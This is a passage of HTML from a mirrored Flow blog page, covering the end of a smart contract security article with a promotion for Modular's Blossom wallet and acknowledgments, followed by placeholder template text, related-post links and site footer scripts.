similar fate.</p><p>At Modular we are working hard on solving many security and usability issues that are present in the ecosystem. We are building Blossom, a new desktop wallet that allows users to avoid complicated key and address management while still keeping complete control over their funds. This wallet will also have KYC integrated into it as well as token and crowdsale launching functionality. You can sign up for newsletters on our signup page to get more updates about the release in the near future.</p><p>Check out our website:<a href="https://modular.network/" target="_blank"> https://modular.network/</a></p><p>Get started with our libraries: <a href="https://github.com/Modular-Network/ethereum-libraries" target="_blank">Ethereum Libraries</a></p><p>Follow us on Twitter: <a href="https://twitter.com/Modular_Inc" target="_blank">@Modular_Inc</a></p><p>Join our Discord chat: <a href="https://discord.gg/sMu6Des" target="_blank">https://discord.gg/sMu6Des</a></p><p>Sign up for the Blossom newsletter: <a href="https://blossomsoftware.com/" target="_blank">https://blossomsoftware.com/</a></p><p><em>Thanks to </em><a href="https://medium.com/u/d9faed34fd6c?source=post_page-----556502629d54--------------------------------" target="_blank"><em>William Dias</em></a><em>, </em><a href="https://twitter.com/jessicica14" target="_blank"><em>Jessica Marshall</em></a><em>, and </em><a href="https://medium.com/u/9504cccc65eb?source=post_page-----556502629d54--------------------------------" target="_blank"><em>C. Brown</em></a><em> for help making this article and presentation. And thanks to </em><a href="https://medium.com/u/7e7962706fb8?source=post_page-----556502629d54--------------------------------" target="_blank"><em>Rhys Lindmark </em></a><em>and the rest of the awesome ETHDenver team for organizing the hackathon and asking us to lead the workshop!</em></p></div><div class="tags-post-div"><div class="tags-title-14">Tags:</div><div class="w-dyn-list"><div role="list" class="tag-cloud w-dyn-items"><div role="listitem" class="w-dyn-item"><div class="tags-title">Ethereum</div></div><div role="listitem" class="w-dyn-item"><div class="tags-title">Security</div></div><div role="listitem" class="w-dyn-item"><div class="tags-title">Smart Contracts</div></div><div role="listitem" class="w-dyn-item"><div class="tags-title">Solidity</div></div><div role="listitem" class="w-dyn-item"><div class="tags-title">Blockchain</div></div></div></div></div></div></div></div></div></div><div class="post-with-text-layout hide"><div class="blog-post-hero-2 no-image wf-section"><div class="post-container w-container"><div><div class="blog-post-meta-data in-post"><div class="blog-post-category">Studio</div><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">03/30/2021</div></div><div class="main-blog-post-title">Welcoming Animoca, MotoGP, and StarGirl to Flow</div><div class="blog-post-meta-data post"><div class="blog-post-meta-text-data dark">Mik Naayem</div><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">CBO and Cofounder at Dapper Labs</div></div></div></div></div><div class="blog-post-section wf-section"><div class="container-25 _1280 w-container"><div class="post-info-parent no-img"><div class="post-share-sidebar"><div class="social-share-btn-2 tw"></div><div class="social-share-btn-2 email"></div><div class="share-text">Share</div></div><div class="post-main-info-div"><div class="blog-post-rich-text w-richtext"><p>The rich text element allows you to create and format headings, paragraphs, blockquotes, images, and video all in one place instead of having to add and format them individually. Just double-click and easily create content.</p><ul role="list"><li>Decentralized because you can set up a blockchain system so that every entity can only make changes within its predefined purview. Companies can also use permissionless, permissioned, or hybrid-approach blockchains, allowing for useful trade-offs between network security and system privacy.</li><li>Decentralized because you can set up a blockchain system so that every entity can only make changes within its predefined purview. Companies can also use permissionless, permissioned, or hybrid-approach blockchains, allowing for useful trade-offs between network security and system privacy.</li><li>scscsssc</li></ul><h4>Static and dynamic content editing</h4><blockquote>A rich text element can be used with static or dynamic content. For static content, just drop it into any page and begin editing. For dynamic content, add a<a href="http://www.google.com"> rich text field to any collection</a> and then connect a rich text element to that field in the settings panel. Voila!</blockquote><h4>How to customize formatting for each rich text</h4><p>Headings, paragraphs, blockquotes, figures, images, and figure captions can all be styled after a class is added to the rich text element using the &quot;When inside of&quot; nested selector system.</p></div></div></div></div></div></div><div class="section-32 wf-section"><div class="container-25 _1280 w-container"><div class="title-div-3"><div>Related Content</div></div><div class="w-dyn-list"><div role="list" class="w-dyn-items"><div role="listitem" class="w-dyn-item"><div class="blog-post-parant-div first"><div class="blog-post-info-div"><a href="/engineering-blogs/upgrading-flows-consensus-follower-to-boost-attack-resilience-and-processing-speed" class="blog-post-title">Upgrading Flow&#x27;s Consensus Follower to boost attack resilience and processing speed</a><div class="blog-post-meta-data"><div class="blog-post-meta-text-data">May 30, 2023</div><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">Jordan Schalm</div></div></div></div></div><div role="listitem" class="w-dyn-item"><div class="blog-post-parant-div first"><div class="blog-post-info-div"><a href="/engineering-blogs/jolteon-advancing-flows-consensus-algorithm" class="blog-post-title">Jolteon: Advancing Flow’s consensus algorithm</a><div class="blog-post-meta-data"><div class="blog-post-meta-text-data">Apr 14, 2023</div><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">Jordan Schalm</div></div></div></div></div><div role="listitem" class="w-dyn-item"><div class="blog-post-parant-div first"><div class="blog-post-info-div"><a href="/engineering-blogs/golang-services-improving-observability" class="blog-post-title">Improving Observability of GoLang Services</a><div class="blog-post-meta-data"><div class="blog-post-meta-text-data">Jan 31, 2023</div><div class="small-dot-sep"></div><div class="blog-post-meta-text-data">Alexey Ivanov</div></div></div></div></div></div></div></div></div></div><div class="section footer wf-section"><div class="footer-div"><div class="join-text-2 no-hover">Join Flow on</div><a href="https://twitter.com/flow_blockchain" target="_blank" class="join-text-2">Twitter</a><a href="https://discord.com/invite/J6fFnh2xx6" target="_blank" class="join-text-2">Discord</a><a href="https://flow.com/" target="_blank" class="join-text-2">flow.com</a></div></div><div class="new-footer wf-section"><div class="container w-container"><div class="w-layout-grid _3-footer-grid"><div><a id="w-node-ec243fb8-8059-5bdb-528d-ce0b082ca18b-082ca187" href="/" class="footer-logo-link w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63ce603ae36f46f6bb67e51e_flow-logo.svg" loading="lazy" alt="flow logo" class="footer-logo-img"/></a><div class="footer-social-icons"><a href="https://twitter.com/flow_blockchain" target="_blank" class="footer-social-icon w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63cec770abbeba426e358f76_Twitter%20-%20Negative.svg" loading="lazy" alt="social icon"/></a><a href="https://www.instagram.com/flowblockchain" target="_blank" class="footer-social-icon w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63cec770799e2958d15306a0_Instagram%20-%20Negative.svg" loading="lazy" alt="social icon"/></a><a href="https://www.youtube.com/@FlowBlockchain" target="_blank" class="footer-social-icon w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63cec77005a49eaba248e147_YouTube%20-%20Negative.svg" loading="lazy" alt="social icon"/></a><a href="https://t.me/flow_blockchain" target="_blank" class="footer-social-icon w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63cec770b75d5482a08014db_Telegram%20-%20Negative.svg" loading="lazy" alt="social icon"/></a><a href="https://discord.com/invite/J6fFnh2xx6" target="_blank" class="footer-social-icon last w-inline-block"><img src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/63d0398494fe5d96e72f4cc0_Social%20Icon.svg" loading="lazy" alt="social icon"/></a></div></div><div id="w-node-_843ebe60-d3a2-032c-780e-737a5989cba0-082ca187"><div class="footer-column-header">Start Building</div><a href="https://developers.flow.com/" target="_blank" class="new-footer-link">Developer portal</a><a href="https://github.com/onflow" target="_blank" class="new-footer-link">GitHub</a></div><div id="w-node-ec243fb8-8059-5bdb-528d-ce0b082ca19f-082ca187"><div class="footer-column-header">Flow</div><a href="https://docs.google.com/forms/d/e/1FAIpQLSer5ZX0pRWsXF0U0bsgW4Zo8Pmlw0V927ZydDq_ej-qyIJ9_A/viewform" target="_blank" class="new-footer-link">Business Development</a><a href="https://flow.com/node-operation" target="_blank" class="new-footer-link">Node Operation</a><a href="/token-distribution" class="new-footer-link">Token Distribution</a><a href="/mediakit" class="new-footer-link">Media Kit</a><a href="/careers" class="new-footer-link">Careers</a><a href="/faq" class="new-footer-link">FAQ</a></div><div id="w-node-ec243fb8-8059-5bdb-528d-ce0b082ca198-082ca187"><div class="footer-column-header">Get Connected</div><a href="https://port.onflow.org/" target="_blank" class="new-footer-link">Flow Port</a><a href="https://www.flowverse.co/" target="_blank" class="new-footer-link">Flowverse</a></div></div><div class="div-block-129"><div class="footer-copyright">© 2023 All Rights Reserved</div></div></div></div><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=5f734f4dbd95382f4fdfa0ea" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://assets-global.website-files.com/5f734f4dbd95382f4fdfa0ea/js/webflow.2724f1538.js" type="text/javascript"></script><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NHJB3BPPXG"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-NHJB3BPPXG');
</script>

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PWSGFLB"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) --><script src="../../cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
<script src="../../cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/unescaped-markup/prism-unescaped-markup.min.js"></script></body>
<!-- Mirrored from flow.com/engineering-blogs/introduction-to-smart-contract-and-dapp-security by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 22 Jul 2023 16:27:43 GMT -->
</html>